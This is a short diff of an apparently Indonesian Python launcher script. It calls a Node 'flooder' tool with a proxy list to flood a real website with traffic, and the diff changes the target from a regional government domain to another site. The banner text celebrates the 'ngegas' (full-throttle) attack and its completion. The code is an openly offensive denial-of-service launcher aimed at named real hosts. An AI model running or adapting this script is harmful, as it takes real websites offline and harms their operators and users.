@@ -35,7 +35,7 @@ print("\x1b[0m" +"\033[42;1m" + "SAATNYA NGEGASSSSS" + "\x1b[0m")
 time.sleep(5)
 print("\x1b[0m" +"\033[32;1m" + current_date_time + "\x1b[0m")
 time.sleep(3)
-os.system('node flooder https://kayumaluepajeko.palukota.go.id 900 20 500 proxy.txt')
+os.system('node flooder https://avtub.stream 900 20 500 proxy.txt')
 print ("\x1b[0m" +"\033[42;1m" '''
 +--------------------------+
 |  PROSES NGEGASS SELESAI  |
